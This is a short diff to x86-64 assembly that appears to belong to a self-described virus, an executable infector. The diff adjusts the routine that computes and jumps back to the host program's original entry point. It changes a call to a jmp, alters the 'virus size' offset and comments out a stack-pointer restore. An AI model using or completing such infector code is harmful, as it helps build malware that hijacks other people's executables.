@@ -29,7 +29,7 @@ _start:
     pop rcx
     pop rax
 
-    call .ret2oep           ; jump to original entry point
+    jmp .ret2oep           ; jump to original entry point
     ret
 
 
@@ -39,8 +39,8 @@ _start:
 
 .ret2oep:
     call .get_rip
-    sub rax, 0x39 ;virus size + 5
+    sub rax, 0x36 ;virus size + 5
     sub rax, 0x11bd
     add rax, 0x1050
-    mov rsp, r14
+    ;mov rsp, r14
     jmp rax
